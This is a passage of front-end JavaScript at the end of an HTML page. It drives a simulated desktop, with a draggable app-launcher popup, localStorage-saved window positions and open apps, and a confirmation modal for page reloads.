        settingsTrigger && settingsTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnSettingsWindow(); });

        // APPTools 1.0 popup: app store that launches apps and hides itself
        var apptoolsTrigger = document.getElementById('apptools-trigger');
        var apptoolsTemplate = document.getElementById('apptools-template');
        var apptoolsLayer = document.getElementById('apptools-layer');
        function spawnAppToolsWindow(){
            if (!apptoolsTemplate || !apptoolsLayer) return null;
            try { if (window.appToolsWin && document.body.contains(window.appToolsWin)) return window.appToolsWin; } catch(e){}
            var win = apptoolsTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            apptoolsLayer.appendChild(win);
            // Restore saved position or center initially
            try {
                var savedLeft = parseInt(localStorage.getItem('apptools.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('apptools.top') || '', 10);
                var cw = win.offsetWidth || 640; var ch = win.offsetHeight || 380;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px'; win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw)/2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch)/2)));
                    win.style.left = left2 + 'px'; win.style.top = top2 + 'px';
                }
            } catch(e){}
            var titlebar = win.querySelector('.apptools-titlebar');
            var closeBtn = win.querySelector('.apptools-close');
            var body = win.querySelector('.apptools-body');
            try { window.addOpenApp && window.addOpenApp('apptools'); } catch(e){}
            // Drag handling
            var dragging = false, offX = 0, offY = 0;
            function onDown(e){ if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return; dragging = true; var r = win.getBoundingClientRect(); offX = (e.clientX||0) - r.left; offY = (e.clientY||0) - r.top; document.body.style.userSelect='none'; }
            function onMove(e){ if(!dragging) return; var left = (e.clientX||0) - offX; var top = (e.clientY||0) - offY; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left<8) left=8; if (top<8) top=8; if (left>maxLeft) left=maxLeft; if (top>maxTop) top=maxTop; win.style.left = left+'px'; win.style.top = top+'px'; }
            function onUp(){
                dragging=false; document.body.style.userSelect='';
                // Persist last position
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('apptools.left', String(Math.round(rect.left)));
                    localStorage.setItem('apptools.top', String(Math.round(rect.top)));
                } catch(e) {}
            }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            document.addEventListener('mousemove', onMove);
            document.addEventListener('mouseup', onUp);
            // Close button
            closeBtn && closeBtn.addEventListener('click', function(){
                try { window.removeOpenApp && window.removeOpenApp('apptools'); } catch(e){}
                try { window.appToolsWin = null; } catch(e){}
                win.remove();
            });
            // Launch handlers for app cards
                var launchers = {
                    notes: function(){ try { if (typeof spawnNotesWindow==='function') spawnNotesWindow(); else document.getElementById('notes-trigger') && document.getElementById('notes-trigger').click(); } catch(e){} },
                    mailer: function(){ try { if (typeof spawnMailerWindow==='function') spawnMailerWindow(); else document.getElementById('mailer-trigger') && document.getElementById('mailer-trigger').click(); } catch(e){} },
                    browser: function(){ try { if (typeof spawnBrowserWindow==='function') spawnBrowserWindow(); else document.getElementById('browser-trigger') && document.getElementById('browser-trigger').click(); } catch(e){} },
                    wallpaper: function(){ try { if (typeof spawnWallpaperWindow==='function') spawnWallpaperWindow(); else document.getElementById('wallpaper-trigger') && document.getElementById('wallpaper-trigger').click(); } catch(e){} },
                    cmd: function(){ try { if (typeof spawnCmdWindow==='function') spawnCmdWindow(); else document.getElementById('cmd-trigger') && document.getElementById('cmd-trigger').click(); } catch(e){} },
                    clean: function(){ try { if (typeof spawnCleanWindow==='function') spawnCleanWindow(); else document.getElementById('clean-trigger') && document.getElementById('clean-trigger').click(); } catch(e){} },
                    trash: function(){ try { if (typeof spawnTrashWindow==='function') spawnTrashWindow(); else document.getElementById('trash-trigger') && document.getElementById('trash-trigger').click(); } catch(e){} },
                    settings: function(){ try { if (typeof spawnSettingsWindow==='function') spawnSettingsWindow(); else document.getElementById('settings-trigger') && document.getElementById('settings-trigger').click(); } catch(e){} },
                    errors: function(){ try { if (typeof spawnErrorsWindow==='function') spawnErrorsWindow(); else document.getElementById('errors-trigger') && document.getElementById('errors-trigger').click(); } catch(e){} },
                    how: function(){ try { if (typeof spawnHowWindow==='function') spawnHowWindow(); else document.getElementById('how-trigger') && document.getElementById('how-trigger').click(); } catch(e){} },
                    about: function(){ try { var aboutTrigger = document.getElementById('about-trigger'); if (aboutTrigger) aboutTrigger.click(); else { var overlay = document.getElementById('about-overlay'); if (overlay){ overlay.style.display=''; overlay.classList && overlay.classList.add('show'); } } } catch(e){} }
                };
            try {
                var cards = win.querySelectorAll('[data-app]');
                Array.prototype.forEach.call(cards, function(card){
                    card.addEventListener('click', function(){
                        var app = (card.getAttribute('data-app')||'').trim();
                        if (app && launchers[app]) { launchers[app](); }
                        // Hide APPTools after launching
                        try { window.removeOpenApp && window.removeOpenApp('apptools'); } catch(e){}
                        try { window.appToolsWin = null; } catch(e){}
                        win.remove();
                    });
                });
            } catch(e){}
            try { window.appToolsWin = win; } catch(e){}
            try { window.spawnAppToolsWindow = spawnAppToolsWindow; } catch(e){}
            return win;
        }
        apptoolsTrigger && apptoolsTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnAppToolsWindow(); });

        var appSpawners = {
            mailer: function(){ try { if (typeof spawnMailerWindow==='function') spawnMailerWindow(); else { var t=document.getElementById('mailer-trigger'); if(t) t.click(); } } catch(e){} },
            browser: function(){ try { if (typeof spawnBrowserWindow==='function') spawnBrowserWindow(); else { var t=document.getElementById('browser-trigger'); if(t) t.click(); } } catch(e){} },
            wallpaper: function(){ try { if (typeof spawnWallpaperWindow==='function') spawnWallpaperWindow(); else { var t=document.getElementById('wallpaper-trigger'); if(t) t.click(); } } catch(e){} },
            cmd: function(){ try { if (typeof spawnCmdWindow==='function') spawnCmdWindow(); else { var t=document.getElementById('cmd-trigger'); if(t) t.click(); } } catch(e){} },
            clean: function(){ try { if (typeof spawnCleanWindow==='function') spawnCleanWindow(); else { var t=document.getElementById('clean-trigger'); if(t) t.click(); } } catch(e){} },
            trash: function(){ try { if (typeof spawnTrashWindow==='function') spawnTrashWindow(); else { var t=document.getElementById('trash-trigger'); if(t) t.click(); } } catch(e){} },
            settings: function(){ try { if (typeof spawnSettingsWindow==='function') spawnSettingsWindow(); else { var t=document.getElementById('settings-trigger'); if(t) t.click(); } } catch(e){} },
            apptools: function(){ try { if (typeof spawnAppToolsWindow==='function') spawnAppToolsWindow(); else { var t=document.getElementById('apptools-trigger'); if(t) t.click(); } } catch(e){} },
            errors: function(){ try { if (typeof spawnErrorsWindow==='function') spawnErrorsWindow(); else { var t=document.getElementById('errors-trigger'); if(t) t.click(); } } catch(e){} },
            how: function(){ try { if (typeof spawnHowWindow==='function') spawnHowWindow(); else { var t=document.getElementById('how-trigger'); if(t) t.click(); } } catch(e){} }
        };
        window.getOpenApps = function(){ try { var raw = localStorage.getItem('openApps'); var arr = raw ? JSON.parse(raw) : []; return Array.isArray(arr) ? arr : []; } catch(e){ return []; } };
        window.setOpenApps = function(arr){ try { localStorage.setItem('openApps', JSON.stringify(Array.from(new Set(arr)))); } catch(e){} };
        window.addOpenApp = function(id){ var a=window.getOpenApps(); if (a.indexOf(id)===-1){ a.push(id); window.setOpenApps(a);} };
        window.removeOpenApp = function(id){ var a=window.getOpenApps().filter(function(x){ return x!==id; }); window.setOpenApps(a); };
        (function restoreOpenApps(){
            try {
                var ids = window.getOpenApps ? window.getOpenApps() : [];
                for (var i=0;i<ids.length;i++){
                    var id = ids[i];
                    var fn = appSpawners[id];
                    if (fn) fn();
                }
            } catch(e){}
        })();
        })();
    </script>
    <script>
    // Confirm Reload modal wiring
    (function(){
        var reloadTrigger = document.getElementById('reload-trigger');
        var ov = document.getElementById('confirm-overlay');
        var closeBtn = document.getElementById('confirm-close-btn');
        var btnCancel = document.getElementById('btn-cancel-reload');
        var btnResend = document.getElementById('btn-resend-reload');
        function showConfirm(){ if (ov) ov.classList.add('show'); }
        function hideConfirm(){ if (ov) ov.classList.remove('show'); }
        if (reloadTrigger) { reloadTrigger.addEventListener('click', function(e){ e.preventDefault(); showConfirm(); }); }
        if (closeBtn) { closeBtn.addEventListener('click', function(){ hideConfirm(); }); }
        if (btnCancel) { btnCancel.addEventListener('click', function(){ hideConfirm(); }); }
        if (btnResend) {
            btnResend.addEventListener('click', function(){
                hideConfirm();
                try { location.reload(); } catch(e){}
            });
        }
        // Intercept Cmd+R / Ctrl+R to show modal across browsers
        document.addEventListener('keydown', function(e){
            var key = (e.key || '').toLowerCase();
            if (key === 'r' && (e.metaKey || e.ctrlKey)) {
                e.preventDefault();
                showConfirm();
            }
        });
    })();
    </script>
</body>
</html>
